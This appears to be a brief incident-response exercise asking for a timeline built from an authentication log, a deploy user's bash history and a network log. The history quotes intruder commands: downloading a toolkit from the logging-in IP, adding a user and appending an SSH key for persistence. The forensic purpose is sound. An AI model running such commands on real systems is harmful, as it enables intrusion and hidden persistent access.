## Incident Timeline Reconstruction

You are asked to build a quick timeline from server artifacts.

### Authentication log

```
02:11 Accepted password for deploy from 203.0.113.5
```

### Bash history (deploy user)

```
02:13 wget http://203.0.113.5/toolkit.tar.gz
02:14 tar -xf toolkit.tar.gz
02:16 sudo useradd backupsvc
02:18 echo "ssh-rsa AAA..." >> /home/backupsvc/.ssh/authorized_keys
```

### Network log

```
02:25 outbound ssh connection to 203.0.113.5
```
